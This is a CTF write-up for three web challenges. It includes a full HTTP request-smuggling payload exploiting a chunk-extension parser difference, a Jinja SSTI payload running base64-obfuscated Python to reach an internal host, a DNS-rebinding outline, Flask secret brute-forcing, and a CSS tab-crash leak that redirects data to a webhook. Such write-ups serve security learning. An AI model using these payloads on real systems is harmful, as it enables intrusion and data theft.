## Web 2
In this challenge, a web server issued a non-admin cookie on every fresh session. `/flag` endpoint needed admin cookie. Headers showed, the backend is go/fasthttp. An endpoint `/promote` could be identified with a bit of fuzzing. The problem is, that route was blocked, and just returned 403 forbidden. With a bit of OSINT on 403 html page, one could have identified that the proxy being used was Apache Traffic Server.

Looking into known past CVEs of ATS, you will find a request smuggling possibility in CVE - XX XXX, related to Chunk Size metadata and you will notice that fasthttp also had some chunk size discrepancy in the past. At this point, searching for this should lead you to [funky chain](https://w4ke.info/2025/06/18/funky-chunks.html) research, detailing this exploit class. This challenge is based on TERM.EXT case.

Basically, our goal is to make the proxy think what we send is a single request, and the backend should parse same think as 2 separate requests. 

Transfer encoding content type needs to define chunk size. HTTP spec allows adding extra info in that chunk size line after `;`. The line ends ONLY after `\r\n` is seen.

But that was not the case with fasthttp. It considered the chunk meta to have ended if it saw `\n`. This allowed parser differential to come into play.

```
Transfer-Encoding: Chunked\r
\r
2;
xx\r
99\r
0\r
\r
......
0
```

Now in this above request, proxy will think `2;` is chunk size line, then read `xx` as chunk body, and then read 99 as next chunk size, and thus ingesting 0x99 bytes as request body.

But when same request reaches fasthttp, it will, take `2;\nxx` as chunk size line, then take `99` as chunk body, and then see 0 as next chunk size, and will think current request has ended. But we still have body left to read, which fasthttp will think is the next HTTP request. That's it, we just need to replace 99 with appropriate chunk size. Here is the final payload - 

```
GET / HTTP/1.1\r
Host: <Host>\r
Transfer-Encoding: chunked\r
\r
2;
xx\r
71\r
0\r
\r
POST /promote HTTP/1.1\r
Cookie: session_token=<32 char token>\r
Transfer-Encoding: chunked\r
\r
0\r
\r

```

## Web 3
Flag 3 was directly available on /flag. Only issue was, it wasn't accessible to non local IP. The bot visited from locally spawned instance, but the issue was CSP was too strong to read /flag content and return back response. 

There were two valid methods to solve this. The easy way was that web 1 and web 3's instance had same IP. So, it was expected to have high chances to be deployed on same machine. Since web 1 gave easy access to RCE, users could directly make network requests. It isn't direct 127.0.0.1:web3_port since, RCE was inside a docker container, but by using standard docker gateway IP - `172.17.0.1`, users could reach the web3 instance, and directly read `172.17.0.1:9956/flag`.

```
{{config.__class__.from_envvar.__globals__.__builtins__.__import__('os').popen("python3 -c \"import base64; exec(base64.b64decode('aW1wb3J0IHVybGxpYi5yZXF1ZXN0LCBzc2w7IGN0eD1zc2wuX2NyZWF0ZV91bnZlcmlmaWVkX2NvbnRleHQoKTsgcmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoJ2h0dHBzOi8vMTcyLjE3LjAuMTo5OTU2L2ZsYWcnKTsgZXhlYygndHJ5OlxuICAgIHByaW50KHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCBjb250ZXh0PWN0eCwgdGltZW91dD0zKS5yZWFkKCkuZGVjb2RlKCkpXG5leGNlcHQgRXhjZXB0aW9uIGFzIGU6XG4gICAgcHJpbnQoZS5yZWFkKCkuZGVjb2RlKCkgaWYgaGFzYXR0cihlLCAicmVhZCIpIGVsc2UgZSknKQ=='))\"").read()}}
```

The direct method involved configuring a domain for a DNS rebinding attack, using multiple A record technique. 

1. Browser will fetch DNS records, get two IPs, x.x.x.x (attacker's) and 127.0.0.1. It renderes page from x.x.x.x.
2. Now x.x.x.x serves malicious JS, and stops responding further. The JS fetches /flag after a bit of delay, and since x.x.x.x wont respond, browser will use 127.0.0.1. Since the host domain is same, there is no CORS, and the malicious JS can read response. On chrome, you will need to circumvent PNA by doing a top level navigation (window.open).

Since this attack was a bit complex, web 1 chain was kept open. 


## Web 4
Web 4 used same web ass as web 3, but flag was the username of admin-bot's account. This forces us to get an attack vector on given app only, since cookie is stored for `nft-app` host. First, use flask-unsign to bruteforce secret_key, which was `hello_world`. Set is_seller to True, making yourself a seller, then you can create products. The description of the product was unsanitized and the XSS sink.

The constraint was that CSP didn't allow any JS at all. And COOP header was set, so no leak through iframes. Styles were allowed, and flag was present in the `data-username` attribute of a span element. So we can apply styles based on some boolean check. But CSP didn't allow external images, so we couldn't have applied background image pointing to our webhook URL.

What we could do was inject a meta redirect, that redirects the page after a bit of delay, to our webhook ONLY if a condition is TRUE. And to prevent this redirect from happening if the condition is False, we crash the tab itself.

Tab crashing CSS - 
```css
width: calc(100% + abs(1vmin * 10%));
```

Now pair it with condition - 
```css
[data-username^="RAIT-CTF{a"] { 
    width: calc(100% + abs(1vmin * 10%));
}     
```

This crashing payload works as of v144. Could split possible chars into half to make it a binary search, speeding up the leak. 